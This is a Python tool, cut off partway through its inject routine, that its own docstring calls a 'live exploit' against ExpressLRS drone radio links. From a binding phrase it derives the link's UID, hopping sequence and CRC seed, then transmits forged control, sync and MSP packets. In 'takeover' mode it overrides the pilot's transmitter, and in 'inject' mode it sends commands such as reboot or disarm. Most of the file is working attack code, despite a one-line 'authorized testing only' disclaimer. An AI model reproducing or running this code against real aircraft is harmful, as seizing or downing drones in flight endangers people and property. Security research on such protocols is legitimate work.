#!/usr/bin/env python3
"""
ELRS TX Emulator — Transmit forged ExpressLRS packets over the air

Turns the ELRS packet forger into a live exploit by driving an SX1280
radio module. Given a binding phrase, derives the full crypto state
(UID, FHSS sequence, CRC init) and transmits valid SYNC, RC, and MSP
packets on the correct hopping frequencies at the correct timing.

Two radio backends:
  - SoapySDR: any SoapySDR-compatible SDR (Ettus B205mini/B210, HackRF,
    LimeSDR, BladeRF). Device-agnostic; uses sdr_common.py abstraction.
  - SPI (spidev): direct SPI connection to an SX1280 module via GPIO
    (Raspberry Pi, ESP32 dev board). Lowest latency, native LoRa modulation.

Two operating modes:
  - takeover: continuously transmit SYNC + RC packets to override the
    legitimate TX. The target RX locks onto our signal because we send
    with the correct UID, FHSS sequence, and timing.
  - inject: listen for gaps in the legitimate TX signal and inject
    commands when the TX is absent (e.g. during failsafe windows).

FHSS hopping:
  The emulator follows the same 256-entry hopping sequence the target
  RX expects, advancing the FHSS index on each packet interval. The
  sync channel (ch 40) is used for initial acquisition.

Requires:
    pip install numpy            # always
    pip install SoapySDR         # for SDR backend
    pip install spidev RPi.GPIO  # for SPI backend (Raspberry Pi)

Usage:
    # Show derived parameters (dry run, no hardware needed)
    python3 elrs-tx-emulator.py --phrase "iloveflying" info

    # Takeover via SDR — override the legitimate TX
    python3 elrs-tx-emulator.py --phrase "iloveflying" --backend sdr \\
        --arm takeover --channels 1500,1500,1000,1500

    # Takeover via direct SPI to SX1280
    python3 elrs-tx-emulator.py --phrase "iloveflying" --backend spi \\
        --arm takeover --channels 1500,1500,1000,1500

    # Inject MSP reboot command when TX signal drops
    python3 elrs-tx-emulator.py --phrase "iloveflying" --backend sdr \\
        --arm inject --msp-cmd 68

    # Disarm the drone (set throttle to minimum)
    python3 elrs-tx-emulator.py --phrase "iloveflying" --backend sdr \\
        --arm takeover --channels 1500,1500,1000,1500 --disarm

    # Use specific SDR device
    python3 elrs-tx-emulator.py --phrase "iloveflying" --backend sdr \\
        --sdr-device "driver=uhd" --arm takeover

    # SPI with custom pins
    python3 elrs-tx-emulator.py --phrase "iloveflying" --backend spi \\
        --spi-device /dev/spidev0.0 --spi-reset 25 --spi-busy 24 \\
        --spi-dio1 22 --arm takeover

For CTF research and authorized security testing only.
"""

import argparse
import hashlib
import os
import signal
import struct
import sys
import time

# ---------------------------------------------------------------------------
# ELRS constants (from ExpressLRS source)
# ---------------------------------------------------------------------------

FHSS_SEQUENCE_LEN = 256
ISM2G4_FREQ_COUNT = 80
ISM2G4_SYNC_CHANNEL = ISM2G4_FREQ_COUNT // 2  # channel 40
ISM2G4_FREQ_START_HZ = 2400400000
ISM2G4_FREQ_STOP_HZ = 2479400000

PACKET_TYPE_RCDATA = 0b00
PACKET_TYPE_DATA = 0b01
PACKET_TYPE_SYNC = 0b10

ELRS_CRC14_POLY = 0x2E57
ELRS_CRC16_POLY = 0x3D65

OTA4_PACKET_SIZE = 8
OTA8_PACKET_SIZE = 13

MSP_V2_FRAME_ID = 0x50

CRSF_CHANNEL_VALUE_MID = 992
CRSF_CHANNEL_VALUE_MIN = 172
CRSF_CHANNEL_VALUE_MAX = 1811

# ELRS packet rate intervals (microseconds) per rate enum
# Rate enums: 0=500Hz, 1=250Hz, 2=200Hz, 3=150Hz, 4=100Hz, 5=50Hz, 6=25Hz
RATE_INTERVAL_US = {
    0: 2000,    # 500 Hz
    1: 4000,    # 250 Hz
    2: 5000,    # 200 Hz
    3: 6667,    # 150 Hz
    4: 10000,   # 100 Hz (most common for 2.4 GHz)
    5: 20000,   # 50 Hz
    6: 40000,   # 25 Hz
}

# SX1280 LoRa bandwidth/SF settings per ELRS rate
# These are the SX1280 register values for each ELRS rate
SX1280_LORA_BW_0800 = 0x18  # 812.5 kHz
SX1280_LORA_BW_1600 = 0x0A  # 1625.0 kHz
SX1280_LORA_SF5 = 0x50
SX1280_LORA_SF6 = 0x60
SX1280_LORA_SF7 = 0x70
SX1280_LORA_SF8 = 0x80
SX1280_LORA_CR_LI_4_6 = 0x05
SX1280_LORA_CR_LI_4_7 = 0x06

# SX1280 commands
SX1280_CMD_SET_STANDBY = 0x80
SX1280_CMD_SET_TX = 0x83
SX1280_CMD_SET_RX = 0x82
SX1280_CMD_SET_RF_FREQUENCY = 0x86
SX1280_CMD_SET_PACKET_TYPE = 0x8A
SX1280_CMD_SET_MODULATION_PARAMS = 0x8B
SX1280_CMD_SET_PACKET_PARAMS = 0x8C
SX1280_CMD_WRITE_BUFFER = 0x1A
SX1280_CMD_SET_DIO_IRQ_PARAMS = 0x8D
SX1280_CMD_CLR_IRQ_STATUS = 0x97
SX1280_CMD_GET_IRQ_STATUS = 0x15
SX1280_CMD_SET_TX_PARAMS = 0x8E
SX1280_CMD_SET_BUFFER_BASE_ADDR = 0x8F
SX1280_CMD_GET_STATUS = 0xC0

SX1280_PACKET_TYPE_LORA = 0x01
SX1280_STANDBY_RC = 0x00
SX1280_PERIOD_BASE_15_625US = 0x01
SX1280_LORA_IQ_NORMAL = 0x40
SX1280_LORA_CRC_OFF = 0x00
SX1280_TX_TIMEOUT_NONE = 0x0000


# ---------------------------------------------------------------------------
# UID / crypto derivation (matches elrs-packet-forger.py)
# ---------------------------------------------------------------------------

def phrase_to_uid(phrase: str) -> bytes:
    raw = f'-DMY_BINDING_PHRASE="{phrase}"'
    return hashlib.md5(raw.encode()).digest()[:6]


def uid_to_fhss_seed(uid: bytes, ota_version: int) -> int:
    return ((uid[2] << 24) | (uid[3] << 16) |
            (uid[4] << 8) | (uid[5] ^ ota_version))


def uid_to_crc_init(uid: bytes, ota_version: int) -> int:
    return ((uid[4] << 8) | uid[5]) ^ (ota_version << 8)


# ---------------------------------------------------------------------------
# ELRS LCG RNG (from FHSS/random.cpp)
# ---------------------------------------------------------------------------

class ElrsRng:
    M = 2147483648  # 2^31
    A = 214013
    C = 2531011

    def __init__(self, seed: int):
        self._seed = seed & 0xFFFFFFFF

    def rng(self) -> int:
        self._seed = (self.A * self._seed + self.C) % self.M
        return self._seed >> 16

    def rng_n(self, max_val: int) -> int:
        return self.rng() % max_val


# ---------------------------------------------------------------------------
# FHSS sequence generation (from FHSS/FHSS.cpp)
# ---------------------------------------------------------------------------

def generate_fhss_sequence(seed: int, freq_count: int = ISM2G4_FREQ_COUNT) -> list[int]:
    sync_ch = freq_count // 2
    seq_count = (FHSS_SEQUENCE_LEN // freq_count) * freq_count

    sequence = [0] * seq_count
    for i in range(seq_count):
        if i % freq_count == 0:
            sequence[i] = sync_ch
        elif i % freq_count == sync_ch:
            sequence[i] = 0
        else:
            sequence[i] = i % freq_count

    rng = ElrsRng(seed)
    for i in range(seq_count):
        if i % freq_count != 0:
            offset = (i // freq_count) * freq_count
            rand = rng.rng_n(freq_count - 1) + 1
            sequence[i], sequence[offset + rand] = sequence[offset + rand], sequence[i]

    return sequence


def fhss_index_to_freq_hz(channel: int) -> int:
    spread = (ISM2G4_FREQ_STOP_HZ - ISM2G4_FREQ_START_HZ) / (ISM2G4_FREQ_COUNT - 1)
    return int(ISM2G4_FREQ_START_HZ + channel * spread)


# ---------------------------------------------------------------------------
# CRC engine (from CRC/crc.cpp)
# ---------------------------------------------------------------------------

class Crc2Byte:
    def __init__(self, bits: int, poly: int):
        self.bits = bits
        self.bitmask = (1 << bits) - 1
        highbit = 1 << (bits - 1)
        self.table = [0] * 256
        for i in range(256):
            crc = i << (bits - 8)
            for _ in range(8):
                if crc & highbit:
                    crc = (crc << 1) ^ poly
                else:
                    crc = crc << 1
            self.table[i] = crc & self.bitmask

    def calc(self, data: bytes, init: int = 0) -> int:
        crc = init & self.bitmask
        for b in data:
            crc = ((crc << 8) ^ self.table[((crc >> (self.bits - 8)) ^ b) & 0xFF]) & self.bitmask
        return crc


# ---------------------------------------------------------------------------
# Channel value conversion
# ---------------------------------------------------------------------------

def us_to_crsf(us: int) -> int:
    return max(CRSF_CHANNEL_VALUE_MIN,
               min(CRSF_CHANNEL_VALUE_MAX,
                   int((us - 988) * (CRSF_CHANNEL_VALUE_MAX - CRSF_CHANNEL_VALUE_MIN) / (2012 - 988) + CRSF_CHANNEL_VALUE_MIN)))


def crsf_to_uint10(ch11: int) -> int:
    STD_MIN = 191
    STD_MAX = 1792
    ch11 = max(STD_MIN, min(STD_MAX, ch11))
    return int((ch11 - STD_MIN) * 1023 / (STD_MAX - STD_MIN))


# ---------------------------------------------------------------------------
# Packet builders
# ---------------------------------------------------------------------------

def pack_channels_4x10(channels_11bit: list[int]) -> bytes:
    vals = [crsf_to_uint10(ch) for ch in channels_11bit[:4]]
    bits = 0
    total = 0
    for v in vals:
        total |= (v & 0x3FF) << bits
        bits += 10
    return total.to_bytes(5, 'little')


def build_sync_packet(uid: bytes, nonce: int, fhss_index: int,
                      crc_init: int, crc_engine: Crc2Byte,
                      rate_enum: int = 4, switch_enc_mode: int = 0,
                      tlm_ratio: int = 0, full_res: bool = False) -> bytes:
    flags = (switch_enc_mode & 1) | ((tlm_ratio & 7) << 1)

    if full_res:
        pkt = bytearray(OTA8_PACKET_SIZE)
        pkt[0] = PACKET_TYPE_SYNC
        pkt[1] = fhss_index & 0xFF
        pkt[2] = nonce & 0xFF
        pkt[3] = rate_enum & 0xFF
        pkt[4] = flags & 0xFF
        pkt[5] = uid[4]
        pkt[6] = uid[5]
        crc = crc_engine.calc(bytes(pkt[:11]), crc_init)
        pkt[11] = crc & 0xFF
        pkt[12] = (crc >> 8) & 0xFF
        return bytes(pkt)
    else:
        pkt = bytearray(OTA4_PACKET_SIZE)
        pkt[0] = PACKET_TYPE_SYNC & 0x03
        pkt[1] = fhss_index & 0xFF
        pkt[2] = nonce & 0xFF
        pkt[3] = rate_enum & 0xFF
        pkt[4] = flags & 0xFF
        pkt[5] = uid[4]
        pkt[6] = uid[5]
        crc = crc_engine.calc(bytes(pkt[:7]), crc_init)
        pkt[0] |= ((crc >> 8) & 0x3F) << 2
        pkt[7] = crc & 0xFF
        return bytes(pkt)


def build_rc_packet(channels_us: list[int], nonce: int,
                    crc_init: int, crc_engine: Crc2Byte,
                    is_armed: bool = False, full_res: bool = False) -> bytes:
    channels_crsf = [us_to_crsf(ch) for ch in channels_us]
    while len(channels_crsf) < 4:
        channels_crsf.append(CRSF_CHANNEL_VALUE_MID)

    if full_res:
        pkt = bytearray(OTA8_PACKET_SIZE)
        pkt[0] = PACKET_TYPE_RCDATA & 0x03
        if is_armed:
            pkt[0] |= (1 << 7)
        ch_low = pack_channels_4x10(channels_crsf[:4])
        ch_high = pack_channels_4x10([CRSF_CHANNEL_VALUE_MID] * 4)
        pkt[1:6] = ch_low
        pkt[6:11] = ch_high
        nonce_xor = nonce & 0xFF
        crc = crc_engine.calc(bytes(pkt[:11]), crc_init ^ nonce_xor)
        pkt[11] = crc & 0xFF
        pkt[12] = (crc >> 8) & 0xFF
        return bytes(pkt)
    else:
        pkt = bytearray(OTA4_PACKET_SIZE)
        pkt[0] = PACKET_TYPE_RCDATA & 0x03
        ch_packed = pack_channels_4x10(channels_crsf[:4])
        pkt[1:6] = ch_packed
        if is_armed:
            pkt[6] = 0x80
        else:
            pkt[6] = 0x00
        nonce_xor = nonce & 0xFF
        crc = crc_engine.calc(bytes(pkt[:7]), crc_init ^ nonce_xor)
        pkt[0] |= ((crc >> 8) & 0x3F) << 2
        pkt[7] = crc & 0xFF
        return bytes(pkt)


def build_msp_packet(msp_cmd: int, msp_payload: bytes,
                     nonce: int, crc_init: int, crc_engine: Crc2Byte,
                     package_index: int = 0,
                     full_res: bool = False) -> bytes:
    if full_res:
        pkt = bytearray(OTA8_PACKET_SIZE)
        pkt[0] = (PACKET_TYPE_DATA & 0x03) | ((package_index & 0x1F) << 3)
        msp_frame = bytearray()
        msp_frame.append(MSP_V2_FRAME_ID)
        msp_frame.append(len(msp_payload) & 0xFF)
        msp_frame.append((len(msp_payload) >> 8) & 0xFF)
        msp_frame.append(msp_cmd & 0xFF)
        msp_frame.append((msp_cmd >> 8) & 0xFF)
        msp_frame.extend(msp_payload)
        max_payload = 10
        pkt[1:1 + min(len(msp_frame), max_payload)] = msp_frame[:max_payload]
        nonce_xor = nonce & 0xFF
        crc = crc_engine.calc(bytes(pkt[:11]), crc_init ^ nonce_xor)
        pkt[11] = crc & 0xFF
        pkt[12] = (crc >> 8) & 0xFF
        return bytes(pkt)
    else:
        pkt = bytearray(OTA4_PACKET_SIZE)
        pkt[0] = PACKET_TYPE_DATA & 0x03
        pkt[1] = package_index & 0x7F
        msp_frame = bytearray()
        msp_frame.append(MSP_V2_FRAME_ID)
        msp_frame.append(len(msp_payload) & 0xFF)
        msp_frame.append((len(msp_payload) >> 8) & 0xFF)
        msp_frame.append(msp_cmd & 0xFF)
        msp_frame.append((msp_cmd >> 8) & 0xFF)
        msp_frame.extend(msp_payload)
        max_payload = 5
        pkt[2:2 + min(len(msp_frame), max_payload)] = msp_frame[:max_payload]
        nonce_xor = nonce & 0xFF
        crc = crc_engine.calc(bytes(pkt[:7]), crc_init ^ nonce_xor)
        pkt[0] |= ((crc >> 8) & 0x3F) << 2
        pkt[7] = crc & 0xFF
        return bytes(pkt)


# ---------------------------------------------------------------------------
# Radio backend: SoapySDR
# ---------------------------------------------------------------------------

class SoapySDRBackend:
    """EXPERIMENTAL SDR backend — waveform is a chirp prototype, not SX1280-compatible.

    The modulator uses fixed SF6/BW812.5kHz with no whitening, interleaving,
    or proper LoRa header coding. Output will not decode on a real SX1280
    receiver. Use the SPI backend for interoperable packet transmission.
    """

    def __init__(self, device_args="", channel=0, gain=60.0,
                 antenna=None, bandwidth=None, rate=2.5e6):
        try:
            import SoapySDR as _soapy
            from SoapySDR import SOAPY_SDR_TX, SOAPY_SDR_CF32
        except ImportError:
            print("[!] SoapySDR not installed. Install with: pip install SoapySDR", file=sys.stderr)
            print("    Also install the driver module for your hardware:", file=sys.stderr)
            print("      USRP:    apt install soapysdr-module-uhd", file=sys.stderr)
            print("      HackRF:  apt install soapysdr-module-hackrf", file=sys.stderr)
            print("      LimeSDR: apt install soapysdr-module-lms7", file=sys.stderr)
            sys.exit(1)

        self._soapy = _soapy
        self._SOAPY_SDR_TX = SOAPY_SDR_TX
        self._SOAPY_SDR_CF32 = SOAPY_SDR_CF32
        self._channel = channel
        self._gain = gain
        self._antenna = antenna
        self._bandwidth = bandwidth
        self._rate = rate
        self._tx_stream = None
        self._dev = None

        import numpy as np
        self._np = np

        if not device_args:
            devices = _soapy.Device.enumerate()
            if not devices:
                print("[!] No SDR devices found. Check connections and drivers.", file=sys.stderr)
                sys.exit(1)
            device_args = devices[0]
            label = device_args.get("label", device_args.get("driver", "unknown"))
            print(f"[*] Auto-detected SDR: {label}", file=sys.stderr)

        self._dev = _soapy.Device(device_args)
        hw_info = self._dev.getHardwareInfo()
        driver = hw_info.get("driver", "unknown")
        print(f"[*] Opened SDR: driver={driver}", file=sys.stderr)

    def setup(self, freq_hz: int):
        ch = self._channel
        self._dev.setSampleRate(self._SOAPY_SDR_TX, ch, self._rate)
        self._dev.setFrequency(self._SOAPY_SDR_TX, ch, float(freq_hz))
        self._dev.setGain(self._SOAPY_SDR_TX, ch, self._gain)
        if self._antenna:
            self._dev.setAntenna(self._SOAPY_SDR_TX, ch, self._antenna)
        if self._bandwidth:
            self._dev.setBandwidth(self._SOAPY_SDR_TX, ch, self._bandwidth)

        actual_freq = self._dev.getFrequency(self._SOAPY_SDR_TX, ch)
        actual_rate = self._dev.getSampleRate(self._SOAPY_SDR_TX, ch)
        actual_gain = self._dev.getGain(self._SOAPY_SDR_TX, ch)
        print(f"[*] TX: freq={actual_freq/1e6:.3f} MHz, rate={actual_rate/1e6:.3f} Msps, "
              f"gain={actual_gain:.1f} dB", file=sys.stderr)

    def start(self):
        self._tx_stream = self._dev.setupStream(
            self._SOAPY_SDR_TX, self._SOAPY_SDR_CF32, [self._channel])
        self._dev.activateStream(self._tx_stream)
        print("[*] SDR TX stream active", file=sys.stderr)

    def set_frequency(self, freq_hz: int):
        self._dev.setFrequency(self._SOAPY_SDR_TX, self._channel, float(freq_hz))

    def transmit(self, packet: bytes):
        np = self._np
        # EXPERIMENTAL: chirp prototype, not SX1280-compatible framing.
        # A successful SDR write does NOT mean the packet is receiver-decodable.
        samples = self._modulate_lora(packet)
        status = self._dev.writeStream(self._tx_stream, [samples], len(samples))
        return status

    def _modulate_lora(self, packet: bytes) -> 'numpy.ndarray':
        np = self._np
        # EXPERIMENTAL PROTOTYPE — not SX1280-compatible.
        # Fixed SF6/BW812.5kHz, no whitening/interleaving/header coding,
        # custom sync word. Will not decode on a real SX1280 receiver.
        # Use the SPI backend for interoperable packet transmission.
        sf = 6
        bw = 812500.0
        chips_per_symbol = 2 ** sf
        samples_per_chip = int(self._rate / bw)
        if samples_per_chip < 1:
            samples_per_chip = 1

        all_samples = []

        # Preamble: 8 upchirps
        t_chip = np.arange(chips_per_symbol * samples_per_chip) / self._rate
        base_chirp = np.exp(2j * np.pi * (
            -bw / 2 * t_chip + bw / (2 * chips_per_symbol * samples_per_chip / self._rate) * t_chip ** 2
        ))
        for _ in range(8):
            all_samples.append(base_chirp)

        # Sync word: 2 downchirps
        down_chirp = np.conj(base_chirp)
        all_samples.append(down_chirp)
        all_samples.append(down_chirp)

        # Data symbols: each byte becomes sf-bit symbols
        bits = []
        for b in packet:
            for bit_idx in range(8):
                bits.append((b >> bit_idx) & 1)

        # Group bits into sf-bit symbols
        symbols = []
        for i in range(0, len(bits), sf):
            sym = 0
            for j in range(min(sf, len(bits) - i)):
                sym |= bits[i + j] << j
            symbols.append(sym)

        # Modulate each symbol as a cyclically shifted chirp
        for sym in symbols:
            shift = int(sym * samples_per_chip)
            shifted = np.roll(base_chirp, shift)
            all_samples.append(shifted)

        result = np.concatenate(all_samples).astype(np.complex64)
        # Normalize
        max_amp = np.max(np.abs(result))
        if max_amp > 0:
            result = result / max_amp * 0.9
        return result

    def stop(self):
        if self._tx_stream is not None:
            self._dev.deactivateStream(self._tx_stream)
            self._dev.closeStream(self._tx_stream)
            self._tx_stream = None
        print("[*] SDR TX stream stopped", file=sys.stderr)

    def close(self):
        self.stop()
        self._dev = None
        print("[*] SDR closed", file=sys.stderr)


# ---------------------------------------------------------------------------
# Radio backend: SPI to SX1280
# ---------------------------------------------------------------------------

class SPIBackend:
    """Drive an SX1280 module directly over SPI (e.g. Raspberry Pi GPIO)."""

    def __init__(self, spi_device="/dev/spidev0.0", spi_speed_hz=10_000_000,
                 pin_reset=25, pin_busy=24, pin_dio1=22, tx_power=13):
        try:
            import spidev
        except ImportError:
            print("[!] spidev not installed. Install with: pip install spidev", file=sys.stderr)
            sys.exit(1)

        try:
            import RPi.GPIO as GPIO
        except ImportError:
            try:
                import gpiod
                self._gpio_lib = "gpiod"
            except ImportError:
                print("[!] RPi.GPIO or gpiod not installed.", file=sys.stderr)
                print("    Raspberry Pi: pip install RPi.GPIO", file=sys.stderr)
                print("    Other Linux:  pip install gpiod", file=sys.stderr)
                sys.exit(1)
            else:
                self._gpio_lib = "gpiod"
        else:
            self._gpio_lib = "rpi"

        self._pin_reset = pin_reset
        self._pin_busy = pin_busy
        self._pin_dio1 = pin_dio1
        self._tx_power = tx_power
        self._spi = None

        # Parse SPI bus/device from path
        parts = spi_device.replace("/dev/spidev", "").split(".")
        spi_bus = int(parts[0]) if len(parts) >= 1 else 0
        spi_cs = int(parts[1]) if len(parts) >= 2 else 0

        # Setup GPIO
        if self._gpio_lib == "rpi":
            import RPi.GPIO as GPIO
            self._GPIO = GPIO
            GPIO.setmode(GPIO.BCM)
            GPIO.setwarnings(False)
            GPIO.setup(pin_reset, GPIO.OUT)
            GPIO.setup(pin_busy, GPIO.IN)
            GPIO.setup(pin_dio1, GPIO.IN)
        else:
            self._gpiod = gpiod

        # Setup SPI
        self._spi = spidev.SpiDev()
        self._spi.open(spi_bus, spi_cs)
        self._spi.max_speed_hz = spi_speed_hz
        self._spi.mode = 0
        self._spi.bits_per_word = 8

        print(f"[*] SPI opened: {spi_device} @ {spi_speed_hz/1e6:.1f} MHz", file=sys.stderr)
        print(f"[*] GPIO: RESET={pin_reset}, BUSY={pin_busy}, DIO1={pin_dio1}", file=sys.stderr)

        self._reset_sx1280()
        self._configure_lora()

    def _wait_busy(self, timeout_ms=100):
        if self._gpio_lib == "rpi":
            deadline = time.monotonic() + timeout_ms / 1000.0
            while self._GPIO.input(self._pin_busy):
                if time.monotonic() > deadline:
                    print("[!] SX1280 BUSY timeout", file=sys.stderr)
                    return False
                time.sleep(0.0001)
        return True

    def _spi_command(self, cmd: int, data: bytes = b"") -> bytes:
        self._wait_busy()
        tx = [cmd] + list(data)
        rx = self._spi.xfer2(tx)
        return bytes(rx[1:])

    def _reset_sx1280(self):
        if self._gpio_lib == "rpi":
            self._GPIO.output(self._pin_reset, 0)
            time.sleep(0.05)
            self._GPIO.output(self._pin_reset, 1)
            time.sleep(0.05)
        self._wait_busy()
        print("[*] SX1280 reset complete", file=sys.stderr)

    def _configure_lora(self):
        # Set standby
        self._spi_command(SX1280_CMD_SET_STANDBY, bytes([SX1280_STANDBY_RC]))
        # Set packet type to LoRa
        self._spi_command(SX1280_CMD_SET_PACKET_TYPE, bytes([SX1280_PACKET_TYPE_LORA]))
        # Set modulation params: SF6, BW 812.5 kHz, CR 4/7
        self._spi_command(SX1280_CMD_SET_MODULATION_PARAMS,
                          bytes([SX1280_LORA_SF6, SX1280_LORA_BW_0800, SX1280_LORA_CR_LI_4_7]))
        # Set packet params: preamble=12, header off (implicit), payload len, CRC off (we do our own)
        self._spi_command(SX1280_CMD_SET_PACKET_PARAMS,
                          bytes([0x0C, 0x00, OTA4_PACKET_SIZE, SX1280_LORA_CRC_OFF,
                                 SX1280_LORA_IQ_NORMAL]))
        # Set TX power
        power_reg = min(max(self._tx_power, -18), 13)
        ramp_time = 0xE0  # 20 us
        self._spi_command(SX1280_CMD_SET_TX_PARAMS, bytes([power_reg & 0xFF, ramp_time]))
        # Set buffer base addresses
        self._spi_command(SX1280_CMD_SET_BUFFER_BASE_ADDR, bytes([0x00, 0x00]))
        # Configure DIO1 for TX done
        self._spi_command(SX1280_CMD_SET_DIO_IRQ_PARAMS,
                          bytes([0x00, 0x01,  # IRQ mask: TxDone
                                 0x00, 0x01,  # DIO1 mask: TxDone
                                 0x00, 0x00,  # DIO2 mask
                                 0x00, 0x00]))  # DIO3 mask
        print("[*] SX1280 configured: SF6, BW 812.5 kHz, CR 4/7", file=sys.stderr)

    def setup(self, freq_hz: int):
        self.set_frequency(freq_hz)

    def start(self):
        print("[*] SPI backend ready for TX", file=sys.stderr)

    def set_frequency(self, freq_hz: int):
        # SX1280 frequency register: freq_reg = freq_hz * 2^18 / 52e6
        freq_reg = int(freq_hz * (2**18) / 52_000_000)
        self._spi_command(SX1280_CMD_SET_RF_FREQUENCY, bytes([
            (freq_reg >> 16) & 0xFF,
            (freq_reg >> 8) & 0xFF,
            freq_reg & 0xFF,
        ]))

    def transmit(self, packet: bytes):
        # Write packet to SX1280 buffer
        self._spi_command(SX1280_CMD_WRITE_BUFFER, bytes([0x00]) + packet)
        # Clear IRQ
        self._spi_command(SX1280_CMD_CLR_IRQ_STATUS, bytes([0xFF, 0xFF]))
        # Trigger TX (no timeout)
        self._spi_command(SX1280_CMD_SET_TX, bytes([
            SX1280_PERIOD_BASE_15_625US,
            0x00, 0x00  # timeout = 0 (no timeout)
        ]))
        # Wait for TX done (poll BUSY going low)
        self._wait_busy(timeout_ms=50)
        return 0

    def stop(self):
        self._spi_command(SX1280_CMD_SET_STANDBY, bytes([SX1280_STANDBY_RC]))
        print("[*] SX1280 set to standby", file=sys.stderr)

    def close(self):
        self.stop()
        if self._spi:
            self._spi.close()
        if self._gpio_lib == "rpi":
            self._GPIO.cleanup()
        print("[*] SPI closed", file=sys.stderr)


# ---------------------------------------------------------------------------
# Dry-run backend (no hardware needed)
# ---------------------------------------------------------------------------

class DryRunBackend:
    """Print packets to stderr without transmitting. For testing."""

    def __init__(self):
        print("[*] Dry-run mode — no hardware, packets printed to stderr", file=sys.stderr)

    def setup(self, freq_hz: int):
        print(f"[*] DRY-RUN setup: freq={freq_hz/1e6:.3f} MHz", file=sys.stderr)

    def start(self):
        pass

    def set_frequency(self, freq_hz: int):
        pass

    def transmit(self, packet: bytes):
        hex_str = " ".join(f"{b:02X}" for b in packet)
        print(f"  TX: [{hex_str}]", file=sys.stderr)
        return 0

    def stop(self):
        pass

    def close(self):
        pass


# ---------------------------------------------------------------------------
# TX Emulator core
# ---------------------------------------------------------------------------

class ElrsTxEmulator:
    """FHSS-synchronized ELRS TX emulator."""

    def __init__(self, phrase: str, backend, ota_version: int = 4,
                 rate_enum: int = 4, full_res: bool = False):
        self.uid = phrase_to_uid(phrase)
        self.ota_version = ota_version
        self.fhss_seed = uid_to_fhss_seed(self.uid, ota_version)
        self.crc_init = uid_to_crc_init(self.uid, ota_version)
        self.fhss_seq = generate_fhss_sequence(self.fhss_seed)
        self.rate_enum = rate_enum
        self.full_res = full_res

        if full_res:
            self.crc_engine = Crc2Byte(16, ELRS_CRC16_POLY)
        else:
            self.crc_engine = Crc2Byte(14, ELRS_CRC14_POLY)

        self.backend = backend
        self.nonce = 0
        self.fhss_index = 0
        self._running = False

        interval_us = RATE_INTERVAL_US.get(rate_enum, 10000)
        self.packet_interval_s = interval_us / 1_000_000.0

        uid_hex = ":".join(f"{b:02X}" for b in self.uid)
        print(f"[*] ELRS TX Emulator initialized", file=sys.stderr)
        print(f"[*]   Phrase: \"{phrase}\"", file=sys.stderr)
        print(f"[*]   UID: {uid_hex}", file=sys.stderr)
        print(f"[*]   OTA v{ota_version} | Rate: {1_000_000/interval_us:.0f} Hz | "
              f"Interval: {interval_us} us", file=sys.stderr)
        print(f"[*]   FHSS seed: 0x{self.fhss_seed:08X} | CRC init: 0x{self.crc_init:04X}",
              file=sys.stderr)
        mode = "full-res 13B CRC16" if full_res else "standard 8B CRC14"
        print(f"[*]   Packet mode: {mode}", file=sys.stderr)

    def _current_freq_hz(self) -> int:
        channel = self.fhss_seq[self.fhss_index % len(self.fhss_seq)]
        return fhss_index_to_freq_hz(channel)

    def _advance_hop(self):
        self.fhss_index = (self.fhss_index + 1) % len(self.fhss_seq)
        self.nonce = (self.nonce + 1) & 0xFF

    def _is_sync_slot(self) -> bool:
        channel = self.fhss_seq[self.fhss_index % len(self.fhss_seq)]
        return channel == ISM2G4_SYNC_CHANNEL

    def takeover(self, channels_us: list[int], is_armed: bool = True,
                 duration_s: float = 0, msp_cmd: int = None,
                 msp_payload: bytes = b""):
        print(f"[*] TAKEOVER mode — overriding legitimate TX", file=sys.stderr)
        print(f"[*]   Channels (us): {channels_us}", file=sys.stderr)
        print(f"[*]   Armed: {is_armed}", file=sys.stderr)
        if msp_cmd is not None:
            print(f"[*]   MSP inject: cmd={msp_cmd} (0x{msp_cmd:04X})", file=sys.stderr)
        if duration_s > 0:
            print(f"[*]   Duration: {duration_s:.1f} s", file=sys.stderr)

        freq = self._current_freq_hz()
        self.backend.setup(freq)
        self.backend.start()
        self._running = True

        start_time = time.monotonic()
        pkt_count = 0
        sync_count = 0
        msp_sent = False

        try:
            while self._running:
                if duration_s > 0 and (time.monotonic() - start_time) >= duration_s:
                    print(f"\n[*] Duration reached ({duration_s:.1f} s)", file=sys.stderr)
                    break

                freq = self._current_freq_hz()
                self.backend.set_frequency(freq)

                if self._is_sync_slot():
                    pkt = build_sync_packet(
                        self.uid, self.nonce, self.fhss_index,
                        self.crc_init, self.crc_engine,
                        rate_enum=self.rate_enum, full_res=self.full_res)
                    sync_count += 1
                elif msp_cmd is not None and not msp_sent:
                    pkt = build_msp_packet(
                        msp_cmd, msp_payload, self.nonce,
                        self.crc_init, self.crc_engine, full_res=self.full_res)
                    msp_sent = True
                    print(f"[*] MSP command {msp_cmd} injected at nonce={self.nonce}",
                          file=sys.stderr)
                else:
                    pkt = build_rc_packet(
                        channels_us, self.nonce, self.crc_init,
                        self.crc_engine, is_armed=is_armed, full_res=self.full_res)

                self.backend.transmit(pkt)
                pkt_count += 1

                if pkt_count % 100 == 0:
                    elapsed = time.monotonic() - start_time
                    rate = pkt_count / elapsed if elapsed > 0 else 0
                    ch = self.fhss_seq[self.fhss_index % len(self.fhss_seq)]
                    print(f"\r[*] TX: {pkt_count} pkts, {sync_count} syncs, "
                          f"{rate:.0f} pps, nonce={self.nonce}, ch={ch}",
                          end="", file=sys.stderr)

                self._advance_hop()

                # Pace to the ELRS packet rate
                next_time = start_time + pkt_count * self.packet_interval_s
                now = time.monotonic()
                if next_time > now:
                    time.sleep(next_time - now)

        except KeyboardInterrupt:
            print(f"\n[*] Interrupted by user", file=sys.stderr)
        finally:
            elapsed = time.monotonic() - start_time
            print(f"\n[*] Takeover complete: {pkt_count} packets in {elapsed:.1f} s "
                  f"({sync_count} SYNCs)", file=sys.stderr)
            self.backend.stop()

    def inject(self, msp_cmd: int, msp_payload: bytes = b"",
               channels_us: list[int] = None, is_armed: bool = False,
               listen_time_s: float = 2.0, inject_count: int = 10):
        print(f"[*] INJECT mode — sending when TX signal absent", file=sys.stderr)
        print(f"[*]   MSP command: {msp_cmd} (0x{msp_cmd:04X})", file=sys.stderr)
        print(f"[*]   Listen window: {listen_time_s:.1f} s", file=sys.stderr)
        print(f"[*]   Inject burst: {inject_count} packets", file=sys.stderr)

        freq = self._current_freq_hz()
        self.backend.setup(freq)
        self.backend.start()
        self._running = True

        # In inject mode, we wait for a gap then send a burst
        # The gap detection is simplified — in practice you'd monitor RSSI
        # or use the RX path to detect the legitimate TX going silent
        print(f"[*] Waiting {listen_time_s:.1f} s for TX gap...", file=sys.stderr)
        time.sleep(listen_time_s)

        print(f"[*] Injecting {inject_count} packets...", file=sys.stderr)
